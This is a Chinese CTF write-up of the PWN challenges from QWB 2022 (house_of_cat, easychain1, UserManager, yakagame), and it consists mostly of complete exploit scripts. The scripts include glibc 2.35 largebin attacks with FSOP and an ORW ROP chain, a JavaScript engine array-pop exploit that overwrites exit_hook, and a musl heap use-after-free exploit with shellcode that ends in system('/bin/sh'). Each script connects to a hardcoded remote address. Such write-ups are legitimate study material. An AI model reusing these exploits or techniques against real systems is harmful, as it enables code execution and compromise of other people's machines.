# **强网杯2022**



# **PWN**



## house_of_cat

2.35-0ubuntu3_amd64，并且开了沙盒，只能用open read write打印flag。

​                 ![img](https://docimg2.docs.qq.com/image/yfPE1mm7FsY5g7VEV-PTcQ.png?w=1280&h=790.5408805031446)        

利用两次largetbin attack攻击stderr和point guard，然后修改top chunk size来触发__malloc_assert劫持控制流来rop。



```python
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
from PwnContext import *
from pwncli import IO_FILE_plus_struct


context.terminal = ['tmux', 'splitw', '-h', '-p70']
#-----function for quick script-----#
s       = lambda data               :ctx.send(data)        
sa      = lambda delim,data         :ctx.sendafter(delim, data) 
sl      = lambda data               :ctx.sendline(data) 
sla     = lambda delim,data         :ctx.sendlineafter(delim, data)
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
irt     = lambda                    :ctx.interactive()


lg 		= lambda s					:log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32    = lambda data   			:u32(data.ljust(4, b'\0'))
uu64    = lambda data   			:u64(data.ljust(8, b'\0'))
getLeak = lambda					:uu64(ru(b'\x7f',drop=False)[-6:])


debugg = 0
logg = 1


ctx.binary = './house_of_cat'


#ctx.custom_lib_dir = './glibc-all-in-one/libs/2.35-0ubuntu3_amd64/'#remote libc
#ctx.debug_remote_libc = True


ctx.symbols = {'note':0x4060}
ctx.breakpoints = []
#ctx.debug()


if debugg:
	rs()
	#rs("gdb",gdbscript="set follow-fork-mode child\nc")
else:
	ctx.remote = ('123.56.87.28', 43634)
	rs(method = 'remote')


if logg:
	context.log_level = 'debug'


def ch(aid):
	sa(b'~~~\n',b'CAT | r00tQWBQWXF $\xff')
	sa(b'choice:',str(aid).encode())
def add(aid,asize,acon):
	ch(1)
	sa(b'idx:\n',str(aid).encode())
	sa(b'size:\n',str(asize).encode())
	sa(b'content:\n',acon)
def free(aid):
	ch(2)
	sa(b'idx:\n',str(aid).encode())
def show(aid):
	ch(3)
	sa(b'idx:\n',str(aid).encode())
def edit(aid,acon):
	ch(4)
	sa(b'idx:\n',str(aid).encode())
	sa(b'content:\n',acon)


sa(b'~~~\n',b'LOGIN | r00tQWBQWXF admin')
#ctx.debug()
#raw_input()


#set overlap
add(0,0x418,b'000')
add(1,0x440,b'111')
free(1)
free(0)


add(2,0x420,b'2'*0x410+p64(0)+p64(0x1581))
add(3,0x440,b'333')
add(4,0x420,b'444')
add(5,0x430,b'555')
add(6,0x430,b'666')


free(3)
add(7,0x460,b'777')# 3->largebin
show(3)
ru('Context:\n')
libc_base = uu64(r(8)) - 0x21a0e0
lg('libc_base')
r(8)
heap = uu64(r(8))
lg('heap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
stderr = libc_base + 0x21a860
mprotect = libc_base + libc.sym['mprotect']
io_str_jumps = libc_base + libc.symbols['_IO_file_jumps']+0xc0
mp_ = libc_base + 0x219360
_IO_wstrn_jumps = libc_base + 0x215dc0
_IO_cookie_jumps = libc_base + 0x215b80
_lock = libc_base + 0x21ba80
point_guard_addr = libc_base - 0x2890
lg('point_guard_addr')
magic_gadget = libc_base + 0x16a1fa # svcudp_reply+26
lg('magic_gadget')
leave_ret = libc_base + 0x562ec
syscall = libc_base + 0x91396
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x90529
pop_rax = libc_base + 0x45eb0


free(5)
edit(3,p64(libc_base+0x21a0e0)*2+p64(heap)+p64(stderr-0x20))
add(8,0x420,b'888')#set stderr


free(6)
edit(3,p64(libc_base+0x21a0e0)*2+p64(heap)+p64(point_guard_addr-0x20))
add(9,0x420,b'/flag')#set point guard


free(1)#up top_chunk


context.arch = 'amd64'
f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._lock = _lock
f2._mode = 0
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x38 # to call _IO_cookie_read
payload = bytes(f2)
payload += p64(heap+0x470-0x48) # rdi
payload += p64(rol(magic_gadget ^ heap, 0x11))
add(10,0x460,payload)


payload = p64(heap+0x470+0x100)#rsp
payload += p64(leave_ret)
payload = payload.ljust(0x100,b'\0')
payload += p64(0)
payload += p64(pop_rdx_rbx)#skip 0x10
payload += p64(0)
payload += p64(heap+0x470+8-0x28)
payload += flat(
	pop_rdi, 0,
	pop_rax, 3,
	syscall, #close(0)
	pop_rdi, heap+0xcd0,
	pop_rsi, 0,
	pop_rax, 2,
	syscall, #open
	pop_rdi, 0,
	pop_rsi, heap-0x100,
	pop_rdx_rbx, 0x30, 0,
	pop_rax, 0,
	syscall, #read
	pop_rdi, 1,
	pop_rsi, heap-0x100,
	pop_rax, 1,
	syscall, #write
)
payload = payload.ljust(0x418,b'\0')
payload += p64(0x441)
add(11,0x460,payload+p64(0x441))
free(8)
add(12,0x430,b'\0'*0x48+p64(0x11))


#ctx.debug(gdbscript="b __malloc_assert\nb _IO_cookie_read")
#raw_input()
add(13,0x420,b'1313')# trigger __malloc_assert


irt()
```



## easychain1

开局直接试array的各个操作，狗屎运第二个就试出了pop的洞，思路同https://www.anquanke.com/post/id/259897#h2-5，没开aslr，先利用got泄露libc，然后改exit_hook为one拿shell



```
baby = ["fuck"];let a = ["fuck"];a.pop();ab = new ArrayBuffer(0x1000);dv = new DataView(ab);;dv.setUint32(0, 0x41414141, true);leak_heap = a[48];fread_got = 0x55621e1;;a[48] = fread_got;;leak_libc = dv.getUint32(0, true) -0x82e60;leak_libc_gao = dv.getUint32(4, true);;exit_hook = leak_libc + 0x228f60;;a[48] = a[48] +0x322;dv.setBigUint64(0, leak_libc_gao*0x100000000+exit_hook, true);;dv.setBigUint64(8, leak_libc_gao*0x100000000+leak_libc + 0xe3afe, true);dv.setBigUint64(0x10, leak_libc_gao*0x100000000+leak_libc + 0xe3afe, true);
```





## UserManager 

musl

root node UAF  



```python
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
prog = './UserManager'
#elf = ELF(prog)#nc 121.36.194.21 49155
# p = process(prog,env={"LD_PRELOAD":"./lib.so"})
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
p = remote("47.93.52.218", 31066)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
	debug_str = ""
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		for i in addr:
			debug_str+='b *{}\n'.format(hex(text_base+i))
		gdb.attach(p,debug_str) 
	else:
		for i in addr:
			debug_str+='b *{}\n'.format(hex(i))
		gdb.attach(p,debug_str) 


def dbg():
	gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))


	
def dbgc(addr):
	gdb.attach(p,"b*" + hex(addr) +"\n c")


def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------


def choice(idx):
	sla(": ",str(idx))


def add(idx,sz,cno):
    choice(1)
    sla("Id: ",idx)
    sla("UserName length: ",sz)
    sla("UserName: ",cno)


def add1(idx,sz,cno):
    choice(1)
    sleep(0.1)
    sl(idx)
    sleep(0.1)


    
    sl(sz)
    
    sleep(0.1)
    sl(cno)
def delete(idx):
	choice(3)
	sla("Id: ",idx)


def show(idx):
	choice(2)
	sla("Id: ",idx)


def clear():
    choice(4)










def exp():
	add(6,0x138,'a'*0x10)
	add(3,0x138,'b'*0x10)
	add(14,0x138,'c'*0x10)
	add(8,0x138,'d'*0x10)
	add(12,0x38,'x'*0x10)
	# add(13,0x138,'c'*0x10)
	add(12,0x38,'1'*0x10)
	# user -> 12 ,but 12 free
	add(7,0x138,'2'*0x10)
	show(12)
	r(8)
	heap = uu64(r(6))
	r(2)
	r(0x10)
	lib = uu64(r(6))
	lg('lib',lib)
	lg('heap',heap)
	addr = lib - 0x7f2e67dbece0 + 0x7f2e67d07000
	lg('addr',addr)
	clear()
	# debug([0x173C,0x17fb])


	context = addr - 0x7fb6dda83000 + 0x7fb6ddb37ac0
	add(1,0x138,'3'*0x10)# fill
	#------------------------------
	clear()
	add(6,0x138,'a'*0x10)
	
	add(14,0x138,'c'*0x10)
	add(8,0x138,'d'*0x10)
	add(12,0x38,'x'*0x10)	
	add(12,0x138,'1'*0x10)
	add(3,0x138,'x'*0x10)
	add(4,0x138,'x'*0x10)
	pay = p64(0xc)+p64(context)+p64(0x0000000000000038)+p64(2)+p64(0x00000000deadbeef)+p64(heap+0x300)+p64(heap+0x300)[:6]
	add(1,0x38,pay)
	show(12)
	secret = uu64(r(8))
	lg('secret',secret)
	#------------------------------
	clear()
	add(6,0x138,'a'*0x10)
	payload = 'X'*0xfe0
	payload += p64(secret) + p64(0) + p64(1) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(heap-0x7d0) + p64(0x0000000000000000)
	payload += p64(0x222)
	add(15,0x1560,payload)
	fake_addr = addr - 0xfe0
	add(8,0x1560,payload)
	add(12,0x38,'x'*0x10)	
	add(12,0x1560,payload)
	add(3,0x1560,payload)




	pay = p64(0xc) + p64(heap-0x7d0+0x10) +p64(fake_addr)+p64(0)+p64(0x00000000deadbeef)+p64(heap-0x8a0)+p64(heap-0x8a0)[:6]
	add(1,0x38,pay)


	#------------------------------
	# debug([0x18D5,0x184E,0x0173C])


	add(12,0x100,'a')#trigger
	#---
	add(15,0x200,'c')


	# delete(12)
	# add(19,0x80,'x')
	# clear()
	#-----------------------


	# add(12,0x138,'1'*0x10)
	# add(3,0x138,'x'*0x10)	


	# delete(14)
	# debug([0x017FB])
	# pay = p64(0xc) + p64(heap-0x7d0+0x10) +p64(fake_addr)+p64(0)+p64(0x00000000deadbeef)+p64(heap+0x300)+p64(heap+0x300)[:6]
	# add(1,0x38,pay)		
	# add(14,0x200,'1')
	mal = addr - 0x7ffb0f311000 +0x7ffb0f3c7f84


	payload = 'X'*(0xfe0-0x50)
	payload += p64(secret) + p64(0) + p64(1) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(mal-0x10+4) + p64(1)
	payload += p64(0x122)	
	__stdout =  addr +0x7ff5f97c8180 - 0x7ff5f9714000




	# # delete(14)
	add(16,0x1560,payload)
	add(17,0x80,'\x00')
	add(16,0x400,'d')
	payload = 'X'*(0xfe0-0x70)
	payload += p64(secret) + p64(0) + p64(1) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(__stdout-0x90) + p64(1)
	payload += p64(0x122)		


	add(0x19,0x1560,payload)
	sys = addr + 0x7efc226d3a90 - 0x7efc22683000
	fake_out = '/bin/sh\x00'+"A"*0x20+p64(heap+2)+b'a'*8+p64(heap+1)+b'a'*8+p64(sys)
	add1(0x20,0x80,fake_out)




	# dbg()
	it()
if __name__ == '__main__':
	exp()
```



## yakagame 

llvm pwn 

越界上写，改cmd sore，堆喷，小爆破

```
; ModuleID = 'gamestart.c'
source_filename = "gamestart.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"


; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @gamestart() #0 {
  call void @a1cc9qf(i32 1)
  call void @a2cc9qf(i32 1)
  call void @a3cc9qf(i32 1)
  call void @a4cc9qf(i32 1)
  call void @a5cc9qf(i32 1)
  call void @a6cc9qf(i32 1)
  call void @a7cc9qf(i32 1)
  call void @a8cc9qf(i32 1)
  call void @a9cc9qf(i32 1)
  call void @a10cc9qf(i32 1)
  call void @a11cc9qf(i32 1)
  call void @a12cc9qf(i32 1)
  call void @a13cc9qf(i32 1)
  call void @a14cc9qf(i32 1)
  call void @a15cc9qf(i32 1)
  call void @a16cc9qf(i32 1)
  call void @a17cc9qf(i32 1)
  call void @a18cc9qf(i32 1)
  call void @a19cc9qf(i32 1)
  call void @a20cc9qf(i32 1)
  call void @a21cc9qf(i32 1)
  call void @a22cc9qf(i32 1)
  call void @a23cc9qf(i32 1)
  call void @a24cc9qf(i32 1)
  call void @a25cc9qf(i32 1)
  call void @a26cc9qf(i32 1)
  call void @a27cc9qf(i32 1)
  call void @a28cc9qf(i32 1)
  call void @a29cc9qf(i32 1)
  call void @a30cc9qf(i32 1)
  call void @a31cc9qf(i32 1)
  call void @a32cc9qf(i32 1)
  call void @a33cc9qf(i32 1)
  call void @a34cc9qf(i32 1)
  call void @a35cc9qf(i32 1)
  call void @a36cc9qf(i32 1)
  call void @a37cc9qf(i32 1)
  call void @a38cc9qf(i32 1)
  call void @a39cc9qf(i32 1)
  call void @a40cc9qf(i32 1)
  call void @a41cc9qf(i32 1)
  call void @a42cc9qf(i32 1)
  call void @a43cc9qf(i32 1)
  call void @a44cc9qf(i32 1)
  call void @a45cc9qf(i32 1)
  call void @a46cc9qf(i32 1)
  call void @a47cc9qf(i32 1)
  call void @a48cc9qf(i32 1)
  call void @a49cc9qf(i32 1)
  call void @a50cc9qf(i32 1)
  call void @a51cc9qf(i32 1)
  call void @a52cc9qf(i32 1)
  call void @a53cc9qf(i32 1)
  call void @a54cc9qf(i32 1)
  call void @a55cc9qf(i32 1)
  call void @a56cc9qf(i32 1)
  call void @a57cc9qf(i32 1)
  call void @a58cc9qf(i32 1)
  call void @a59cc9qf(i32 1)
  call void @a60cc9qf(i32 1)
  call void @a61cc9qf(i32 1)
  call void @a62cc9qf(i32 1)
  call void @a63cc9qf(i32 1)
  call void @a64cc9qf(i32 1)
  call void @a65cc9qf(i32 1)
  call void @a66cc9qf(i32 1)
  call void @a67cc9qf(i32 1)
  call void @a68cc9qf(i32 1)
  call void @a69cc9qf(i32 1)
  call void @a70cc9qf(i32 1)
  call void @a71cc9qf(i32 1)
  call void @a72cc9qf(i32 1)
  call void @a73cc9qf(i32 1)
  call void @a74cc9qf(i32 1)
  call void @a75cc9qf(i32 1)
  call void @a76cc9qf(i32 1)
  call void @a77cc9qf(i32 1)
  call void @a78cc9qf(i32 1)
  call void @a79cc9qf(i32 1)
  call void @a80cc9qf(i32 1)
  call void @a81cc9qf(i32 1)
  call void @a82cc9qf(i32 1)
  call void @a83cc9qf(i32 1)
  call void @a84cc9qf(i32 1)
  call void @a85cc9qf(i32 1)
  call void @a86cc9qf(i32 1)
  call void @a87cc9qf(i32 1)
  call void @a88cc9qf(i32 1)
  call void @a89cc9qf(i32 1)
  call void @a90cc9qf(i32 1)
  call void @a91cc9qf(i32 1)
  call void @a92cc9qf(i32 1)
  call void @a93cc9qf(i32 1)
  call void @a94cc9qf(i32 1)
  call void @a95cc9qf(i32 1)
  call void @a96cc9qf(i32 1)
  call void @a97cc9qf(i32 1)
  call void @a98cc9qf(i32 1)
  call void @a99cc9qf(i32 1)
  call void @b01cc9qf(i32 1)
  call void @b02cc9qf(i32 1)
  call void @b03cc9qf(i32 1)
  call void @b04cc9qf(i32 1)
  call void @b05cc9qf(i32 1)
  call void @b06cc9qf(i32 1)
  call void @b07cc9qf(i32 1)
  call void @b08cc9qf(i32 1)
  call void @b09cc9qf(i32 1)
  call void @b10cc9qf(i32 1)
  call void @b11cc9qf(i32 1)
  call void @b12cc9qf(i32 1)
  call void @b13cc9qf(i32 1)
  call void @b14cc9qf(i32 1)
  call void @b15cc9qf(i32 1)
  call void @b16cc9qf(i32 1)
  call void @b17cc9qf(i32 1)
  call void @b18cc9qf(i32 1)
  call void @b19cc9qf(i32 1)
  call void @b20cc9qf(i32 1)
  call void @b21cc9qf(i32 1)
  call void @b22cc9qf(i32 1)
  call void @b23cc9qf(i32 1)
  call void @b24cc9qf(i32 1)
  call void @b25cc9qf(i32 1)
  call void @b26cc9qf(i32 1)
  call void @b27cc9qf(i32 1)
  call void @b28cc9qf(i32 1)
  call void @b29cc9qf(i32 1)
  call void @b30cc9qf(i32 1)
  call void @b31cc9qf(i32 1)
  call void @b32cc9qf(i32 1)
  call void @b33cc9qf(i32 1)
  call void @b34cc9qf(i32 1)
  call void @b35cc9qf(i32 1)
  call void @b36cc9qf(i32 1)
  call void @b37cc9qf(i32 1)
  call void @b38cc9qf(i32 1)
  call void @b39cc9qf(i32 1)
  call void @b40cc9qf(i32 1)
  call void @b41cc9qf(i32 1)
  call void @b42cc9qf(i32 1)
  call void @b43cc9qf(i32 1)
  call void @b44cc9qf(i32 1)
  call void @b45cc9qf(i32 1)
  call void @b46cc9qf(i32 1)
  call void @b47cc9qf(i32 1)
  call void @b48cc9qf(i32 1)
  call void @b49cc9qf(i32 1)
  call void @b50cc9qf(i32 1)
  call void @b51cc9qf(i32 1)
  call void @b52cc9qf(i32 1)
  call void @b53cc9qf(i32 1)
  call void @b54cc9qf(i32 1)
  call void @b55cc9qf(i32 1)
  call void @b56cc9qf(i32 1)
  call void @b57cc9qf(i32 1)
  call void @b58cc9qf(i32 1)
  call void @b59cc9qf(i32 1)
  call void @b60cc9qf(i32 1)
  call void @b61cc9qf(i32 1)
  call void @b62cc9qf(i32 1)
  call void @b63cc9qf(i32 1)
  call void @b64cc9qf(i32 1)
  call void @b65cc9qf(i32 1)
  call void @b66cc9qf(i32 1)
  call void @b67cc9qf(i32 1)
  call void @b68cc9qf(i32 1)
  call void @b69cc9qf(i32 1)
  call void @b70cc9qf(i32 1)
  call void @b71cc9qf(i32 1)
  call void @b72cc9qf(i32 1)
  call void @b73cc9qf(i32 1)
  call void @b74cc9qf(i32 1)
  call void @b75cc9qf(i32 1)
  call void @b76cc9qf(i32 1)
  call void @b77cc9qf(i32 1)
  call void @b78cc9qf(i32 1)
  call void @b79cc9qf(i32 1)
  call void @b80cc9qf(i32 1)
  call void @b81cc9qf(i32 1)
  call void @b82cc9qf(i32 1)
  call void @b83cc9qf(i32 1)
  call void @b84cc9qf(i32 1)
  call void @b85cc9qf(i32 1)
  call void @b86cc9qf(i32 1)
  call void @b87cc9qf(i32 1)
  call void @b88cc9qf(i32 1)
  call void @b89cc9qf(i32 1)
  call void @b90cc9qf(i32 1)
  call void @b91cc9qf(i32 1)
  call void @b92cc9qf(i32 1)
  call void @b93cc9qf(i32 1)
  call void @b94cc9qf(i32 1)
  call void @b95cc9qf(i32 1)
  call void @b96cc9qf(i32 1)
  call void @b97cc9qf(i32 1)
  call void @b98cc9qf(i32 1)
  call void @b99cc9qf(i32 1)
  call void @c1cc9qf(i32 1)
  call void @c2cc9qf(i32 1)
  call void @c3cc9qf(i32 1)
  call void @c4cc9qf(i32 1)
  call void @c5cc9qf(i32 1)
  call void @c6cc9qf(i32 1)
  call void @c7cc9qf(i32 1)
  call void @c8cc9qf(i32 1)
  call void @c9cc9qf(i32 1)
  call void @c10cc9qf(i32 1)
  call void @c11cc9qf(i32 1)
  call void @c12cc9qf(i32 1)
  call void @c13cc9qf(i32 1)
  call void @c14cc9qf(i32 1)
  call void @c15cc9qf(i32 1)
  call void @c16cc9qf(i32 1)
  call void @c17cc9qf(i32 1)
  call void @c18cc9qf(i32 1)
  call void @c19cc9qf(i32 1)
  call void @c20cc9qf(i32 1)
  call void @c21cc9qf(i32 1)
  call void @c22cc9qf(i32 1)
  call void @c23cc9qf(i32 1)
  call void @c24cc9qf(i32 1)
  call void @c25cc9qf(i32 1)
  call void @c26cc9qf(i32 1)
  call void @c27cc9qf(i32 1)
  call void @c28cc9qf(i32 1)
  call void @c29cc9qf(i32 1)
  call void @c30cc9qf(i32 1)
  call void @c31cc9qf(i32 1)
  call void @c32cc9qf(i32 1)
  call void @c33cc9qf(i32 1)
  call void @c34cc9qf(i32 1)
  call void @c35cc9qf(i32 1)
  call void @c36cc9qf(i32 1)
  call void @c37cc9qf(i32 1)
  call void @c38cc9qf(i32 1)
  call void @c39cc9qf(i32 1)
  call void @c40cc9qf(i32 1)
  call void @c41cc9qf(i32 112)
  call void @c42cc9qf(i32 65)
  call void @c43cc9qf(i32 1)
  call void @c44cc9qf(i32 1)
  call void @c45cc9qf(i32 1)
  call void @c46cc9qf(i32 1)
  call void @c47cc9qf(i32 1)
  call void @c48cc9qf(i32 1)
  call void @c49cc9qf(i32 64)
  call void @c50cc9qf(i32 1)
  call void @c51cc9qf(i32 1)
  call void @c52cc9qf(i32 1)
  call void @c53cc9qf(i32 1)
  call void @c54cc9qf(i32 1)
  call void @c55cc9qf(i32 1)
  call void @c56cc9qf(i32 1)
  call void @c57cc9qf(i32 1)
  call void @c58cc9qf(i32 1)
  call void @c59cc9qf(i32 1)
  call void @c60cc9qf(i32 1)
  call void @c41cc9qf(i32 112)
  call void @c42cc9qf(i32 76)
  call void @c49cc9qf(i32 64)
  call void (...) @tiandongwanxiang()
  call void @fight(i64 0)
  ret void
}


declare dso_local void @a1cc9qf(i32) #1


declare dso_local void @a2cc9qf(i32) #1


declare dso_local void @a3cc9qf(i32) #1


declare dso_local void @a4cc9qf(i32) #1


declare dso_local void @a5cc9qf(i32) #1


declare dso_local void @a6cc9qf(i32) #1


declare dso_local void @a7cc9qf(i32) #1


declare dso_local void @a8cc9qf(i32) #1


declare dso_local void @a9cc9qf(i32) #1


declare dso_local void @a10cc9qf(i32) #1


declare dso_local void @a11cc9qf(i32) #1


declare dso_local void @a12cc9qf(i32) #1


declare dso_local void @a13cc9qf(i32) #1


declare dso_local void @a14cc9qf(i32) #1


declare dso_local void @a15cc9qf(i32) #1


declare dso_local void @a16cc9qf(i32) #1


declare dso_local void @a17cc9qf(i32) #1


declare dso_local void @a18cc9qf(i32) #1


declare dso_local void @a19cc9qf(i32) #1


declare dso_local void @a20cc9qf(i32) #1


declare dso_local void @a21cc9qf(i32) #1


declare dso_local void @a22cc9qf(i32) #1


declare dso_local void @a23cc9qf(i32) #1


declare dso_local void @a24cc9qf(i32) #1


declare dso_local void @a25cc9qf(i32) #1


declare dso_local void @a26cc9qf(i32) #1


declare dso_local void @a27cc9qf(i32) #1


declare dso_local void @a28cc9qf(i32) #1


declare dso_local void @a29cc9qf(i32) #1


declare dso_local void @a30cc9qf(i32) #1


declare dso_local void @a31cc9qf(i32) #1


declare dso_local void @a32cc9qf(i32) #1


declare dso_local void @a33cc9qf(i32) #1


declare dso_local void @a34cc9qf(i32) #1


declare dso_local void @a35cc9qf(i32) #1


declare dso_local void @a36cc9qf(i32) #1


declare dso_local void @a37cc9qf(i32) #1


declare dso_local void @a38cc9qf(i32) #1


declare dso_local void @a39cc9qf(i32) #1


declare dso_local void @a40cc9qf(i32) #1


declare dso_local void @a41cc9qf(i32) #1


declare dso_local void @a42cc9qf(i32) #1


declare dso_local void @a43cc9qf(i32) #1


declare dso_local void @a44cc9qf(i32) #1


declare dso_local void @a45cc9qf(i32) #1


declare dso_local void @a46cc9qf(i32) #1


declare dso_local void @a47cc9qf(i32) #1


declare dso_local void @a48cc9qf(i32) #1


declare dso_local void @a49cc9qf(i32) #1


declare dso_local void @a50cc9qf(i32) #1


declare dso_local void @a51cc9qf(i32) #1


declare dso_local void @a52cc9qf(i32) #1


declare dso_local void @a53cc9qf(i32) #1


declare dso_local void @a54cc9qf(i32) #1


declare dso_local void @a55cc9qf(i32) #1


declare dso_local void @a56cc9qf(i32) #1


declare dso_local void @a57cc9qf(i32) #1


declare dso_local void @a58cc9qf(i32) #1


declare dso_local void @a59cc9qf(i32) #1


declare dso_local void @a60cc9qf(i32) #1


declare dso_local void @a61cc9qf(i32) #1


declare dso_local void @a62cc9qf(i32) #1


declare dso_local void @a63cc9qf(i32) #1


declare dso_local void @a64cc9qf(i32) #1


declare dso_local void @a65cc9qf(i32) #1


declare dso_local void @a66cc9qf(i32) #1


declare dso_local void @a67cc9qf(i32) #1


declare dso_local void @a68cc9qf(i32) #1


declare dso_local void @a69cc9qf(i32) #1


declare dso_local void @a70cc9qf(i32) #1


declare dso_local void @a71cc9qf(i32) #1


declare dso_local void @a72cc9qf(i32) #1


declare dso_local void @a73cc9qf(i32) #1


declare dso_local void @a74cc9qf(i32) #1


declare dso_local void @a75cc9qf(i32) #1


declare dso_local void @a76cc9qf(i32) #1


declare dso_local void @a77cc9qf(i32) #1


declare dso_local void @a78cc9qf(i32) #1


declare dso_local void @a79cc9qf(i32) #1


declare dso_local void @a80cc9qf(i32) #1


declare dso_local void @a81cc9qf(i32) #1


declare dso_local void @a82cc9qf(i32) #1


declare dso_local void @a83cc9qf(i32) #1


declare dso_local void @a84cc9qf(i32) #1


declare dso_local void @a85cc9qf(i32) #1


declare dso_local void @a86cc9qf(i32) #1


declare dso_local void @a87cc9qf(i32) #1


declare dso_local void @a88cc9qf(i32) #1


declare dso_local void @a89cc9qf(i32) #1


declare dso_local void @a90cc9qf(i32) #1


declare dso_local void @a91cc9qf(i32) #1


declare dso_local void @a92cc9qf(i32) #1


declare dso_local void @a93cc9qf(i32) #1


declare dso_local void @a94cc9qf(i32) #1


declare dso_local void @a95cc9qf(i32) #1


declare dso_local void @a96cc9qf(i32) #1


declare dso_local void @a97cc9qf(i32) #1


declare dso_local void @a98cc9qf(i32) #1


declare dso_local void @a99cc9qf(i32) #1


declare dso_local void @b01cc9qf(i32) #1


declare dso_local void @b02cc9qf(i32) #1


declare dso_local void @b03cc9qf(i32) #1


declare dso_local void @b04cc9qf(i32) #1


declare dso_local void @b05cc9qf(i32) #1


declare dso_local void @b06cc9qf(i32) #1


declare dso_local void @b07cc9qf(i32) #1


declare dso_local void @b08cc9qf(i32) #1


declare dso_local void @b09cc9qf(i32) #1


declare dso_local void @b10cc9qf(i32) #1


declare dso_local void @b11cc9qf(i32) #1


declare dso_local void @b12cc9qf(i32) #1


declare dso_local void @b13cc9qf(i32) #1


declare dso_local void @b14cc9qf(i32) #1


declare dso_local void @b15cc9qf(i32) #1


declare dso_local void @b16cc9qf(i32) #1


declare dso_local void @b17cc9qf(i32) #1


declare dso_local void @b18cc9qf(i32) #1


declare dso_local void @b19cc9qf(i32) #1


declare dso_local void @b20cc9qf(i32) #1


declare dso_local void @b21cc9qf(i32) #1


declare dso_local void @b22cc9qf(i32) #1


declare dso_local void @b23cc9qf(i32) #1


declare dso_local void @b24cc9qf(i32) #1


declare dso_local void @b25cc9qf(i32) #1


declare dso_local void @b26cc9qf(i32) #1


declare dso_local void @b27cc9qf(i32) #1


declare dso_local void @b28cc9qf(i32) #1


declare dso_local void @b29cc9qf(i32) #1


declare dso_local void @b30cc9qf(i32) #1


declare dso_local void @b31cc9qf(i32) #1


declare dso_local void @b32cc9qf(i32) #1


declare dso_local void @b33cc9qf(i32) #1


declare dso_local void @b34cc9qf(i32) #1


declare dso_local void @b35cc9qf(i32) #1


declare dso_local void @b36cc9qf(i32) #1


declare dso_local void @b37cc9qf(i32) #1


declare dso_local void @b38cc9qf(i32) #1


declare dso_local void @b39cc9qf(i32) #1


declare dso_local void @b40cc9qf(i32) #1


declare dso_local void @b41cc9qf(i32) #1


declare dso_local void @b42cc9qf(i32) #1


declare dso_local void @b43cc9qf(i32) #1


declare dso_local void @b44cc9qf(i32) #1


declare dso_local void @b45cc9qf(i32) #1


declare dso_local void @b46cc9qf(i32) #1


declare dso_local void @b47cc9qf(i32) #1


declare dso_local void @b48cc9qf(i32) #1


declare dso_local void @b49cc9qf(i32) #1


declare dso_local void @b50cc9qf(i32) #1


declare dso_local void @b51cc9qf(i32) #1


declare dso_local void @b52cc9qf(i32) #1


declare dso_local void @b53cc9qf(i32) #1


declare dso_local void @b54cc9qf(i32) #1


declare dso_local void @b55cc9qf(i32) #1


declare dso_local void @b56cc9qf(i32) #1


declare dso_local void @b57cc9qf(i32) #1


declare dso_local void @b58cc9qf(i32) #1


declare dso_local void @b59cc9qf(i32) #1


declare dso_local void @b60cc9qf(i32) #1


declare dso_local void @b61cc9qf(i32) #1


declare dso_local void @b62cc9qf(i32) #1


declare dso_local void @b63cc9qf(i32) #1


declare dso_local void @b64cc9qf(i32) #1


declare dso_local void @b65cc9qf(i32) #1


declare dso_local void @b66cc9qf(i32) #1


declare dso_local void @b67cc9qf(i32) #1


declare dso_local void @b68cc9qf(i32) #1


declare dso_local void @b69cc9qf(i32) #1


declare dso_local void @b70cc9qf(i32) #1


declare dso_local void @b71cc9qf(i32) #1


declare dso_local void @b72cc9qf(i32) #1


declare dso_local void @b73cc9qf(i32) #1


declare dso_local void @b74cc9qf(i32) #1


declare dso_local void @b75cc9qf(i32) #1


declare dso_local void @b76cc9qf(i32) #1


declare dso_local void @b77cc9qf(i32) #1


declare dso_local void @b78cc9qf(i32) #1


declare dso_local void @b79cc9qf(i32) #1


declare dso_local void @b80cc9qf(i32) #1


declare dso_local void @b81cc9qf(i32) #1


declare dso_local void @b82cc9qf(i32) #1


declare dso_local void @b83cc9qf(i32) #1


declare dso_local void @b84cc9qf(i32) #1


declare dso_local void @b85cc9qf(i32) #1


